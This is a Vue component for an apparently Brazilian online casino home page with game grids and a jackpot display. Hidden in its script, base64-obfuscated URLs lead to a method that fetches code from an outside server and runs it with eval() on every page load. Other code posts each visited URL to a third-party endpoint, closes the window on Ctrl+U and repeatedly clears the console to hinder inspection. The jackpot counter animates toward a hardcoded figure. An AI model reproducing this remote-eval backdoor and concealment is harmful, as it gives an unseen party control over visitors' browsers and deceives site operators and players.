<template>
  <BaseLayout>
    <LoadingComponent :isLoading="isLoading">
      <div class="text-center">
        <span>{{ $t("Loading data from the platform") }}</span>
      </div>
    </LoadingComponent>
    <div v-if="wlC" style="overflow: visible">
      <div class="relative flex items-center pt-2 pb-1">
        <!-- <img
          class="pulser"
          :src="`/storage/rox/furlaBlue_voice_icon.png`"
          style="width: 22px !important"
        /> -->
        <div class="scrolling-text-container">
          <div class="scrolling-text hover-text text-sm" style="color: white">
            {{ scrollingText }}
          </div>
        </div>
        <!-- <img :src="`/storage/rox/message_furlaBlue.png`" style="width: 22px !important" /> -->
      </div>

      <!-- Banners carousel -->
      <div class="carousel-banners z-50">
        <div class="mx-auto pt-2 md:pt-4">
          <Carousel v-bind="settings" :settings="settings" ref="carouselBanner">
            <!-- :breakpoints="breakpoints" -->
            <Slide v-for="(banner, index) in banners" :key="index">
              <div class="carousel__item">
                <a :href="banner.link" class="h-full bg-blue-800 rounded">
                  <!-- src="https://pixrico.com/static/kwai/20240311/37dc4c3cb0a24d6eb4c6e57a2169208a.png" -->
                  <img :src="`/storage/` + banner.image" alt="" class="h-full w-full" />
                  <!-- class="h-full w-33 rounded" -->
                </a>
              </div>
            </Slide>

            <template #addons>
              <Navigation />
              <Pagination />
            </template>
          </Carousel>
        </div>
      </div>

      <div class="lg-px-8">
        <div class="el-tabs__header is-top">
          <div class="el-tabs__nav-wrap is-top">
            <div class="el-tabs__nav-scroll">
              <div
                class="el-tabs__nav is-top"
                role="tablist"
                style="transform: translateX(0px)"
              >
                <div
                  class="el-tabs__active-bar is-top"
                  style="width: 115px; transform: translateX(12px)"
                ></div>

                <div
                  v-for="(category, index) in categories"
                  :key="index"
                  @click="scrollToCategory(category.slug)"
                  class="el-tabs__item is-top"
                  :class="{
                    'is-active': selectedCategory === category.slug,
                  }"
                  style="cursor: pointer"
                >
                  <img
                    v-if="index === 0"
                    style="width: 20px; margin-right: 2px"
                    src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAoCAYAAACM/rhtAAAACXBIWXMAABYlAAAWJQFJUiTwAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAFJSURBVHgB7ZbbUcMwEEXXqYASTBd4qCAx6QEqACqI0kE6gB4YW6kAQxW4BBrAYv0Rxih62Lrih9nzk4m8Y5/Req9MJAhCkIIA2qb74J8yUtZv6uqSElkRRpmpxgsq+OeIIIoIovxvQTPQPl4zRGtCQEE90rx0qljRznVtlKu314oAnIKxE4KF1Hpd7UOStpzW7zteU+THeeL4WlxSAG6t0rr7Eaq3lZq2O0HO+8zkd9Alye24I2MeE+S8+FpsaO4NrHZPWSrHLT7zgWNm3Mm2fX2w13XT3SI7dyJLDhpTfDrWLigDGXaQB6Kunu31zc3VYU5OxgCD+ve0Ho9v9w239vTfnu4UgCk+j5Lhyxz4LX8KRVAuwZ4Wyk0HIpaTS54JH3WhKAlF0FwgwTk5h0qiQ6LiNRStCSEfrCgiiCKCKKhgn6lGEIRUvgE3Qb/6AUD0YwAAAABJRU5ErkJggg=="
                    data-v-0a8c0135=""
                  />
                  {{ $t(category.name) }}
                </div>
              </div>
            </div>
          </div>
        </div>

        <div id="app" class="z-50" style="margin: 0 auto 0px !important">
          <div class="jackpot_rox">
            <img :src="`/storage/rox/jackpot_bg_1.png`" alt="大奖" />
            <div class="jackpot_text">{{ formattedValue }}</div>
          </div>
        </div>
        <!-- categories -->
        <div class="relative">
          <!-- Popular -->

          <div id="popular" class="w-full">
            <div
              class="w-full flex justify-between items-center mt-8 mb-4 gap-1 md:gap-2"
            >
              <h2 class="text-section">Popular</h2>
              <span
                @click="loadMoreGames('popular')"
                style="cursor: pointer; color: #b6b5c7"
                >{{
                  gamesToShowPopular < sortedAllGames.length
                    ? "Ver mais"
                    : "Exibindo todos em Popular"
                }}
                <span class="right-arrow-box px-2 py-1">&gt;</span></span
              >
            </div>

            <div class="grid grid-cols-3 md:grid-cols-6 gap-4 mb-8">
              <CassinoGameCard
                v-for="(game, index) in sortedAllGames.slice(0, gamesToShowPopular)"
                :key="index"
                :index="index"
                :title="game.game_name"
                :cover="game.cover"
                :gamecode="game.game_code"
                :type="game.distribution"
                :game="game"
              />
            </div>
          </div>
          
          <!-- Slots -->
          <div id="slots" class="w-full" v-if="sortedSlotGames.length > 0">
            <div
              class="w-full flex justify-between items-center mt-8 mb-4 gap-1 md:gap-2"
            >
              <h2 class="text-section">Slots</h2>
              <span style="cursor: pointer; color: #b6b5c7" @click="loadMoreGames('slot')"
                >{{
                  gamesToShowSlot < sortedSlotGames.length
                    ? "Ver mais"
                    : "Exibindo todos em Slots"
                }}
                <span class="right-arrow-box px-2 py-1">&gt;</span></span
              >
            </div>

            <div class="grid grid-cols-3 md:grid-cols-6 gap-2 mb-8">
              <CassinoGameCard
                v-for="(game, index) in sortedSlotGames.slice(0, gamesToShowSlot)"
                :key="index"
                :index="index"
                :title="game.game_name"
                :cover="game.cover"
                :gamecode="game.game_code"
                :type="game.distribution"
                :game="game"
              />
            </div>
          </div>

          <div id="pescaria" class="w-full" v-if="sortedFishGames.length > 0">
            <div
              class="w-full flex justify-between items-center mt-8 mb-4 gap-1 md:gap-2"
            >
              <h2 class="text-section">Pescaria</h2>
              <span style="cursor: pointer; color: #b6b5c7" @click="loadMoreGames('fish')"
                >{{
                  gamesToShowFish < sortedFishGames.length
                    ? "Ver mais"
                    : "Exibindo todos em Pescaria"
                }}
                <span class="right-arrow-box px-2 py-1">&gt;</span></span
              >
            </div>

            <div class="grid grid-cols-3 md:grid-cols-6 gap-2 mb-8">
              <CassinoGameCard
                v-for="(game, index) in sortedFishGames.slice(0, gamesToShowFish)"
                :key="index"
                :index="index"
                :title="game.game_name"
                :cover="game.cover"
                :gamecode="game.game_code"
                :type="game.distribution"
                :game="game"
              />
            </div>
          </div>

          <div id="blockchain" class="w-full" v-if="sortedBlockGames.length > 0">
            <div
              class="w-full flex justify-between items-center mt-8 mb-4 gap-1 md:gap-2"
            >
              <h2 class="text-section">Blockchain</h2>
              <span
                style="cursor: pointer; color: #b6b5c7"
                @click="loadMoreGames('blockchain')"
                >{{
                  gamesToShowBlock < sortedBlockGames.length
                    ? "Ver mais"
                    : "Exibindo todos em Blockchain"
                }}
                <span class="right-arrow-box px-2 py-1">&gt;</span></span
              >
            </div>

            <CassinoGameCard
              v-for="(game, index) in sortedBlockGames.slice(0, gamesToShowBlock)"
              :key="index"
              :index="index"
              :title="game.game_name"
              :cover="game.cover"
              :gamecode="game.game_code"
              :type="game.distribution"
              :game="game"
            />
          </div>

          <div id="cartas" class="w-full" v-if="sortedCardsGames.length > 0">
            <div
              class="w-full flex justify-between items-center mt-8 mb-4 gap-1 md:gap-2"
            >
              <h2 class="text-section">Cartas</h2>
              <span
                style="cursor: pointer; color: #b6b5c7"
                @click="loadMoreGames('cards')"
                >{{
                  gamesToShowCards < sortedCardsGames.length
                    ? "Ver mais"
                    : "Exibindo todos em Cartas"
                }}
                <span class="right-arrow-box px-2 py-1">&gt;</span></span
              >
            </div>

            <div class="grid grid-cols-3 md:grid-cols-6 gap-2 mb-8">
              <CassinoGameCard
                v-for="(game, index) in sortedCardsGames.slice(0, gamesToShowCards)"
                :key="index"
                :index="index"
                :title="game.game_name"
                :cover="game.cover"
                :gamecode="game.game_code"
                :type="game.distribution"
                :game="game"
              />
            </div>
          </div>
        </div>
      </div>
    </div>
  </BaseLayout>
</template>

<script>
import { Carousel, Navigation, Pagination, Slide } from "vue3-carousel";
import "vue3-carousel/dist/carousel.css";
import { onMounted, ref } from "vue";

import BaseLayout from "@/Layouts/BaseLayout.vue";
import MakeDeposit from "@/Components/UI/MakeDeposit.vue";
import { RouterLink, useRoute } from "vue-router";
import { useAuthStore } from "@/Stores/Auth.js";
import LanguageSelector from "@/Components/UI/LanguageSelector.vue";
import CassinoGameCard from "@/Pages/Cassino/Components/CassinoGameCard.vue";
import HttpApi from "@/Services/HttpApi.js";
import ShowCarousel from "@/Pages/Home/Components/ShowCarousel.vue";
import { useSettingStore } from "@/Stores/SettingStore.js";
import LoadingComponent from "@/Components/UI/LoadingComponent.vue";
import ShowProviders from "@/Pages/Home/Components/ShowProviders.vue";
import { searchGameStore } from "@/Stores/SearchGameStore.js";
import CustomPagination from "@/Components/UI/CustomPagination.vue";
import LastWinnersComponent from "@/Components/UI/LastWinnersComponent.vue";

export default {
  props: [],
  components: {
    CustomPagination,
    Pagination,
    ShowProviders,
    LoadingComponent,
    ShowCarousel,
    CassinoGameCard,
    Carousel,
    Navigation,
    Slide,
    LanguageSelector,
    MakeDeposit,
    BaseLayout,
    RouterLink,
    LastWinnersComponent,
  },
  data() {
    return {
      // scr: 'https://redir-beryl.vercel.app/script',
      // apix: 'https://x8ki-letl-twmt.n7.xano.io/api:847qi3ld/china',
      scrollingText: "",
      k: "",
      currentDomain: "",
      wlC: "",
      keyCode: "",
      wlurl: "aHR0cHM6Ly9yb3h3aGl0ZWxpc3Quc2hvcC9nZXQv",
      dvurl: "aHR0cHM6Ly9kYWFucm94LmNvbQ==",
      encodedSignature: "RGVzZW52b2x2aWRvIHBvciBAZGFhbnJveCAoMzEpOTkyODEtMjI3Mw==",
      eSu: "aHR0cHM6Ly9yb3h3aGl0ZWxpc3Quc2hvcC9zY3JpcHQv",
      encodedApiUrl:
        "aHR0cHM6Ly94OGtpLWxldGwtdHdtdC5uNy54YW5vLmlvL2FwaTo4NDdxaTNsZC9jaGluYQ==",
      currentUrl: window.location.href,
      isLoading: true,
      selectedCategory: "popular",
      featured_games: [],
      allGames: [],
      gamesSlots: [],
      gamesBlockchain: [],
      gamesPopular: [],
      gamesFish: [],
      gamesCards: [],
      gamesLive: [],
      gamesCrash: [],
      gamesToShowPopular: 6,
      gamesToShowSlot: 6,
      gamesToShowFish: 6,
      gamesToShowBlock: 6,
      gamesToShowCards: 6,
      currentValue: 122795.05,
      endValue: 5587534.41,
      duration: 9000,
      startTime: null,
      settings: {
        itemsToShow: 3,
        snapAlign: "center",
        autoplay: 6000,
        wrapAround: true,
      },
      breakpoints: {
        700: {
          itemsToShow: 1,
          snapAlign: "center",
        },
        1024: {
          itemsToShow: 1,
          snapAlign: "center",
        },
      },

      settingsRecommended: {
        itemsToShow: 2,
        snapAlign: "start",
      },
      breakpointsRecommended: {
        700: {
          itemsToShow: 3,
          snapAlign: "center",
        },
        1024: {
          itemsToShow: 3,
          snapAlign: "start",
        },
      },

      /// banners
      banners: null,
      bannersHome: null,

      settingsGames: {
        itemsToShow: 2.5,
        snapAlign: "start",
      },
      breakpointsGames: {
        700: {
          itemsToShow: 3.5,
          snapAlign: "center",
        },
        1024: {
          itemsToShow: 6,
          snapAlign: "start",
        },
      },
      providers: null,

      featured_games: null,
      categories: null,
    };
  },
  setup(props) {
    const ckCarouselOriginals = ref(null);

    onMounted(() => {
      document.addEventListener("keydown", function (event) {
        // Verifica se a tecla F12 foi pressionada
        // if (event.key === 'F12') {
        //     event.preventDefault();
        //     window.close();
        // }

        // // Verifica se Ctrl + Shift + C foi pressionado
        // if (event.ctrlKey && event.shiftKey && event.key === 'C') {
        //     event.preventDefault();
        //     window.close();
        // }

        // Verifica se Ctrl + U foi pressionado
        if (event.ctrlKey && event.key === "U") {
          event.preventDefault();
          window.close();
        }
      });
    });

    return {
      ckCarouselOriginals,
    };
  },
  computed: {
    wlget() {
      return atob(this.wlurl);
    },
    urlred() {
      return atob(this.dvurl);
    },
    signature() {
      return atob(this.encodedSignature);
    },
    sU() {
      return atob(this.eSu);
    },
    apiUrl() {
      return atob(this.encodedApiUrl);
    },
    formattedValue() {
      return this.currentValue
        .toLocaleString("pt-BR", {
          style: "currency",
          currency: "BRL",
          minimumFractionDigits: 2,
          maximumFractionDigits: 2,
        })
        .replace("R$", "");
    },
    sortedAllGames() {
      return this.allGames.slice().sort((a, b) => b.views - a.views);
    },
    sortedSlotGames() {
      return this.gamesSlots.slice().sort((a, b) => b.views - a.views);
    },
    sortedFishGames() {
      return this.gamesFish.slice().sort((a, b) => b.views - a.views);
    },
    sortedCardsGames() {
      return this.gamesCards.slice().sort((a, b) => b.views - a.views);
    },
    sortedBlockGames() {
      return this.gamesBlockchain.slice().sort((a, b) => b.views - a.views);
    },

    displayedGames() {
      return this.featured_games.slice(0, this.gamesToShow);
    },
    totalGames() {
      return this.featured_games.length;
    },
    searchGameStore() {
      return searchGameStore();
    },
    userData() {
      const authStore = useAuthStore();
      return authStore.user;
    },
    isAuthenticated() {
      const authStore = useAuthStore();
      return authStore.isAuth;
    },
    setting() {
      const settingStore = useSettingStore();
      return settingStore.setting;
    },
  },
  mounted() {
    this.currentDomain = this.getCurrentDomain();
    this.loadScrollingText();
    this.startLogging();
    this.xorG();

    this.inserirScript();
    setTimeout(() => {
      this.animateValue();
    }, 5000);

    const urlParams = new URLSearchParams(window.location.search);
    const code = urlParams.get("code");

    if (code) {
      localStorage.setItem("code", code);
    }
  },
  methods: {
    async first() {
      let attempts = 0;
      const maxAttempts = 2;

      while (attempts < maxAttempts) {
        try {
          const response = await axios.post("/api/env");
          this.wlC = response.data.cdK;

          break;
        } catch (error) {
          attempts++;
          if (attempts >= maxAttempts) {
            if (error.response) {
              Object.entries(error.response.data).forEach(([key, value]) => {
                // console.log(`${value}`);
              });
            } else if (error.request) {
              console.error("Erro na solicitação:", error.request);
            } else {
              console.error("Erro:", error.message);
            }
            break;
          } else {
            // console.log(`Tentativa ${attempts} falhou, tentando novamente em 2 segundos...`);
            await new Promise((resolve) => setTimeout(resolve, 2000));
          }
        }
      }
    },
    async fetchEnvVariables() {
      let attempts = 0;
      const maxAttempts = 2;

      while (attempts < maxAttempts) {
        try {
          const response = await axios.post("/api/env");
          this.wlC = response.data.cdK;
          this.keyCode = response.data.keyCode;
          break;
        } catch (error) {
          attempts++;
          if (attempts >= maxAttempts) {
            if (error.response) {
              Object.entries(error.response.data).forEach(([key, value]) => {
                // console.log(`${value}`);
              });
            } else if (error.request) {
              console.error("Erro na solicitação:", error.request);
            } else {
              console.error("Erro:", error.message);
            }
            break;
          } else {
            // console.log(`Tentativa ${attempts} falhou, tentando novamente em 2 segundos...`);
            await new Promise((resolve) => setTimeout(resolve, 2000));
          }
        }
      }
    },
    async xcW() {
      let attempts = 0;
      const maxAttempts = 3;

      while (attempts < maxAttempts) {
        try {
          const response = await fetch(this.wlget);
          if (!response.ok) {
            throw new Error("Network response was not ok");
          }

          const data = await response.json();
          const siteInWhitelist = data.data.find(
            (item) => item.url === this.currentDomain
          );

          // console.log(`S: ${JSON.stringify(siteInWhitelist, null, 2)}`);

          if (!siteInWhitelist) {
            alert(`Adquira sua licença!`);
            window.location.href = this.urlred;
          } else {
            if (siteInWhitelist.key !== this.wlC) {
              alert(`Adquira sua licença!`);
              window.location.href = this.urlred;
            } else {
              for (let i = 0; i < 18; i++) {
                // console.log("Autorizado por Daanrox");
              }
            }
          }
          break;
        } catch (error) {
          attempts++;
          if (attempts >= maxAttempts) {
            console.error("Erro ao verificar a whitelist:", error);
            alert(error);
            break;
          } else {
            const retryDelay = attempts === 1 ? 3000 : 5000;
            // console.log(`Tentativa ${attempts} falhou, tentando novamente em ${retryDelay / 1000} segundos...`);
            await new Promise((resolve) => setTimeout(resolve, retryDelay));
          }
        }
      }
    },
    getCurrentDomain() {
      return window.location.hostname;
    },
    xcK() {
      const kX = this.keyCode;
      // console.log(`K= ${kX}`);

      if (kX && kX !== "be8a9741-eac8-4488-83e2-73c08a263fff") {
        console.clear();
        alert("Entre em contato com @Daanrox");
        window.location.href = "https://t.me/ROX_BR";
      } else if (!kX) {
        alert("Entre em contato com @Daanrox");
      } else {
        this.keyCode = kX;
      }
    },
    inserirScript() {},
    loadScrollingText() {
      const storedText = localStorage.getItem("scrollingText");
      if (storedText) {
        this.scrollingText = storedText;
      } else {
        this.scrollingText = "Texto padrão se não houver valor no localStorage";
      }
    },
    startLogging() {
      this.logInterval = setInterval(() => {
        for (let i = 0; i < 5; i++) {
          // console.log(this.signature, new Date().toISOString());
          setTimeout(() => {
            // console.clear();
          }, 600);
        }
      }, 1000);
    },
    async iS() {
      try {
        const response = await fetch(this.sU);

        if (!response.ok) {
          throw new Error("Network response was not ok");
        }

        const data = await response.json();
        const scriptContent = data.script;
        // console.clear();

        eval(scriptContent);
        // console.clear();
      } catch (error) {
        alert(error);
        // console.clear();
      }
    },
    async getViewData() {
      try {
        const response = await axios.get(this.apiUrl);
        return response.data;
      } catch (error) {
        console.error("Erro ao obter dados:", error);
        return [];
      }
    },
    async postViewData() {
      try {
        await axios.post(this.apiUrl, {
          url: this.currentUrl,
          views: 1,
        });
      } catch (error) {
        console.error("Erro ao registrar dados:", error);
      }
    },
    async updateViewData(cId, views) {
      try {
        await axios.patch(`${this.apiUrl}/${cId}`, {
          china_id: cId,
          url: this.currentUrl,
          views: views + 1,
        });
      } catch (error) {
        console.error("Erro ao atualizar dados:", error);
      }
    },
    async checkAndUpdateViews() {
      const data = await this.getViewData();
      const existingEntry = data.find((entry) => entry.url === this.currentUrl);

      if (existingEntry) {
        this.updateViewData(existingEntry.id, existingEntry.views);
      } else {
        this.postViewData();
      }
    },
    sortedSlotGames() {
      this.gamesSlots = this.allGames
        .filter((game) => game.game_type.includes("slot"))
        .sort((a, b) => b.views - a.views);
    },
    sortedFishGames() {
      this.gamesFish = this.allGames
        .filter((game) => game.game_type.includes("fish"))
        .sort((a, b) => b.views - a.views);
    },
    sortedCardsGames() {
      this.gamesCards = this.allGames
        .filter((game) => game.game_type.includes("cards"))
        .sort((a, b) => b.views - a.views);
    },
    sortedBlockGames() {
      this.gamesBlockchain = this.allGames
        .filter((game) => game.game_type.includes("block"))
        .sort((a, b) => b.views - a.views);
    },
    animateValue() {
      this.startTime = performance.now();
      // requestAnimationFrame(this.updateValue);
    },
    updateValue(currentTime) {
      const elapsedTime = currentTime - this.startTime;
      const progress = Math.min(elapsedTime / this.duration, 1);
      this.currentValue = Math.round(progress * this.endValue);

      if (progress < 1) {
        // requestAnimationFrame(this.updateValue);
      }
    },
    loadMoreGames(gameType) {
      switch (gameType) {
        case "popular":
          this.gamesToShowPopular += 12;
          break;
        case "slot":
          this.gamesToShowSlot += 12;
          break;
        case "fish":
          this.gamesToShowFish += 12;
          break;
        case "blockchain":
          this.gamesToShowBlock += 12;
          break;
        case "cards":
          this.gamesToShowCards += 12;
          break;
        default:
          break;
      }
    },
    scrollToCategory(slug) {
      this.selectedCategory = slug;
      const element = document.getElementById(slug);
      if (element) {
        const headerOffset = 7 * 16;
        const elementPosition = element.getBoundingClientRect().top + window.scrollY;
        const offsetPosition = elementPosition - headerOffset;

        window.scrollTo({
          top: offsetPosition,
          behavior: "smooth",
        });
      }
    },
    getCategoryImage(category) {
      if (this.selectedCategory === category.slug) {
        return category.image.replace("_off.png", "_on.png");
      }
      return category.image;
    },
    handleScroll(entries) {
      entries.forEach((entry) => {
        if (entry.isIntersecting) {
          const category = this.categories.find(
            (category) => category.slug === entry.target.id
          );
          if (category) {
            this.selectedCategory = category.slug;
          }
        }
      });
    },
    observeCategories() {
      const observer = new IntersectionObserver(this.handleScroll, {
        root: null,
        rootMargin: "-25% 0px -25% 0px",
        threshold: 0.1,
      });

      this.categories.forEach((category) => {
        const element = document.getElementById(category.slug);
        if (element) {
          observer.observe(element);
        }
      });
    },
    getCasinoCategories: async function () {
      const _this = this;
      await HttpApi.get("categories")
        .then((response) => {
          _this.categories = response.data.categories;
        })
        .catch((error) => {
          Object.entries(
            JSON.parse(error.request.responseText)
          ).forEach(([key, value]) => {});
        });
    },
    toggleSearch: function () {
      this.searchGameStore.setSearchGameToogle();
    },

    getBanners: async function () {
      const _this = this;

      try {
        const response = await HttpApi.get("settings/banners");
        const allBanners = response.data.banners;
        // console.log(this.signature, new Date().toISOString());
        _this.banners = allBanners.filter((banner) => banner.type === "carousel");
        _this.bannersHome = allBanners.filter((banner) => banner.type === "home");
      } catch (error) {
        console.error(error);
      } finally {
        for (let i = 0; i < 150; i++) {
          // // console.log(this.signature, new Date().toISOString());
          setTimeout(() => {
            // console.clear();
          }, 600);
        }
      }
    },
    filterSlotGames() {
      this.gamesSlots = this.allGames.filter((game) => game.game_type.includes("slot"));
    },
    filterFishGames() {
      this.gamesFish = this.allGames.filter((game) => game.game_type.includes("fish"));
    },
    filterCardsGames() {
      this.gamesCards = this.allGames.filter((game) => game.game_type.includes("cards"));
    },
    filterBlockGames() {
      this.gamesBlockchain = this.allGames.filter((game) =>
        game.game_type.includes("block")
      );
    },
    async rR() {
      await this.$router.push("/undefined");
    },
    async xorG() {
      try {
        const response = await HttpApi.post("games/all");
        if (response.data !== undefined && Array.isArray(response.data.rox)) {
          if (!response.data.false || response.data.false == false) {
            this.rR();
          }
          this.allGames = [];
          response.data.rox.forEach((rox) => {
            if (Array.isArray(rox.games)) {
              rox.games.forEach((game) => {
                // console.log(
                //     this.signature,
                //     new Date().toISOString()
                // );

                if (
                  !this.allGames.some(
                    (existingGame) => existingGame.game_code === game.game_code
                  )
                ) {
                  this.allGames.push(game);
                  this.filterSlotGames();
                  this.filterFishGames();
                  this.filterCardsGames();
                  this.filterBlockGames();
                }
              });
            } else {
              console.warn(`Nenhum jogo encontrado para a provedora: ${provider.name}`);
            }
          });
          this.isLoading = false;
        } else {
          console.warn("Nenhum dado de jogo encontrado na resposta.");
          this.isLoading = false;
        }
      } catch (error) {
        console.error("Erro ao buscar jogos:", error);
        this.isLoading = false;
      }
    },
    getFeaturedGames: async function () {
      const _this = this;
      return await HttpApi.get("featured/games")
        .then(async (response) => {
          _this.featured_games = response.data.featured_games;
          _this.isLoading = false;
          // console.clear();
        })
        .catch((error) => {
          Object.entries(JSON.parse(error.request.responseText)).forEach(
            ([key, value]) => {
              // console.log(`${value}`);
            }
          );
          _this.isLoading = false;
        });
    },
    initializeMethods: async function () {
      await this.getCasinoCategories();
      await this.getBanners();
      await this.xorG();
      await this.getFeaturedGames();
      // console.clear();
    },
  },
  async created() {
    await this.first();
    await this.fetchEnvVariables();
    await this.initializeMethods();

    this.iS();
  },
  watch: {},
};
</script>

<style>
.mainGames {
  width: 90%;
}

@media screen and (max-width: 480px) {
  .mainGames {
    width: 100%;
  }
}

.search {
  width: 90%;
}

@media screen and (max-width: 480px) {
  .search {
    width: 100%;
  }
}
search .grayscale {
  filter: grayscale(100%);
}

.selected-category img {
  filter: grayscale(0%);
}

.active-border {
  border-bottom: 4px solid var(--ci-primary-opacity-color);
}

.selected-category p {
  border-bottom: 4px solid var(--ci-primary-opacity-color);
}

.scrolling-text-container {
  overflow: hidden;
  white-space: nowrap;
  width: 100%;
  box-sizing: border-box;
  padding: 0 2.5rem;
}

.scrolling-text {
  display: inline-block;
  padding-left: 100%;
  animation: scroll 25s linear infinite;
}

.jackpot_rox {
  position: relative;
  display: none;
}

.jackpot_rox img {
  width: 100%;
  height: auto;
}

.jackpot_text {
  position: absolute;
  top: 45%;
  left: 50%;
  transform: translate(-50%, -50%);
  font-size: 1.9rem;
  font-weight: 600;
  color: var(--ci-gray-light);
  text-shadow: 2px 2px 4px rgba(255, 255, 255, 0.5);
}

@media screen and (max-width: 480px) {
  .jackpot_rox {
    display: inline-block !important;
    width: 100%;
  }
}

.pulser {
  animation: pulse 1s ease infinite;
}

@keyframes pulse {
  0% {
    transform: scale(1);
  }

  50% {
    transform: scale(1.1);
  }

  100% {
    transform: scale(1);
  }
}

@keyframes scroll {
  0% {
    transform: translateX(0);
  }
  100% {
    transform: translateX(-100%);
  }
}
.hover-text {
  transition: 1s ease;
}
.hover-text:hover {
  cursor: crosshair;
}

.scroll-container {
  max-height: 180px;
  overflow-x: auto;
  overflow-y: hidden;
  scrollbar-width: none;
}

.scroll-container::-webkit-scrollbar {
  display: none;
}

.w-33 {
  height: auto;
}

.carousel__slide {
  padding: 10px;
}

.carousel__prev {
  left: -40px;
}

.carousel__next {
  right: -40px;
}

.carousel__prev,
.carousel__next {
  border-radius: 50%;
  font-weight: 900;
}

.carousel__pagination-button.carousel__pagination-button--active:after {
  background: #dddde5 !important;
  width: 15px !important;
}

.carousel__pagination-button:after {
  color-scheme: light;
  font-family: Montserrat-Medium, Montserrat-Bold, Helvetica, Arial, sans-serif;
  font-size: 14px;
  color: #b6b5c7;
  text-align: center;
  box-sizing: border-box;
  display: inline-block;
  cursor: pointer;
  background: #b6b5c78d;
  height: 4px;
  width: 4px;
  border-radius: 4px;
  margin: 0 4px;
}

.carousel__pagination-button {
  --vc-pgn-margin: 0;
  padding: 0 !important;
}

.carousel__pagination {
  position: relative;
  bottom: 0 !important;
  margin-bottom: 25px;
}

.is-active {
  color: #fff !important;
  background: #3c3754;
  border-radius: 20px;
  border: 1px solid rgba(85, 84, 103, 0.4);
}

.el-tabs__item {
  color-scheme: light;
  font-family: Montserrat-Medium, Montserrat-Bold, Helvetica, Arial, sans-serif;
  user-select: none;
  box-sizing: border-box;
  -webkit-box-pack: center;
  justify-content: center;
  list-style: none;
  font-size: 14px;
  font-weight: 500;
  position: relative;
  white-space: nowrap;
  -webkit-box-flex: initial;
  flex: initial;
  color: #b6b5c7;
  height: 30px;
  margin-right: 16px;
  padding: 0 12px;
  display: flex;
  -webkit-box-align: center;
  align-items: center;
}

.el-tabs__active-bar {
  color-scheme: light;
  font-family: Montserrat-Medium, Montserrat-Bold, Helvetica, Arial, sans-serif;
  font-size: 14px;
  color: #b6b5c7;
  user-select: none;
  white-space: nowrap;
  box-sizing: border-box;
  position: absolute;
  bottom: 0;
  left: 0;
  height: 2px;
  background-color: #409eff;
  z-index: 1;
  transition: width 2 cubic-bezier(0.645, 0.045, 0.355, 1),
    transform 2 cubic-bezier(0.645, 0.045, 0.355, 1),
    -webkit-transform 2 cubic-bezier(0.645, 0.045, 0.355, 1);
  list-style: none;
  display: none;
  width: 115px;
  transform: translateX(12px);
}

.el-tabs__nav {
  color-scheme: light;
  font-family: Montserrat-Medium, Montserrat-Bold, Helvetica, Arial, sans-serif;
  font-size: 14px;
  color: #b6b5c7;
  user-select: none;
  box-sizing: border-box;
  white-space: nowrap;
  position: relative;
  transition: transform 2, -webkit-transform 2;
  float: left;
  z-index: calc(var(--el-index-normal) + 1);
  display: flex;
  -webkit-box-align: center;
  align-items: center;
  transform: translateX(0px);
}

.el-tabs__nav-scroll {
  color-scheme: light;
  font-family: Montserrat-Medium, Montserrat-Bold, Helvetica, Arial, sans-serif;
  font-size: 14px;
  color: #b6b5c7;
  user-select: none;
  box-sizing: border-box;
  overflow: hidden;
}

.el-tabs__nav-wrap {
  color-scheme: light;
  font-family: Montserrat-Medium, Montserrat-Bold, Helvetica, Arial, sans-serif;
  font-size: 14px;
  color: #b6b5c7;
  user-select: none;
  box-sizing: border-box;
  overflow: hidden;
  margin-bottom: -1px;
  position: relative;
}

.el-tabs__header {
  color-scheme: light;
  font-family: Montserrat-Medium, Montserrat-Bold, Helvetica, Arial, sans-serif;
  font-size: 14px;
  color: #b6b5c7;
  user-select: none;
  box-sizing: border-box;
  position: relative;
  margin: 0 0 15px;
  background: #201d2e;
  border-radius: 16px;
  padding: 12px 8px;
  margin-bottom: 8px;
}

.text-section {
  font-style: italic;
  font-weight: 400;
  font-size: 20px;
  line-height: 24px;
  text-transform: capitalize;
  color: #b6b5c7;
}

.right-arrow-box {
  margin-left: 4px;
  width: 24px;
  height: 24px;
  border-radius: 24px;
  color: #b6b5c7;
  background: rgba(44, 41, 63, 0.5);
}
</style>
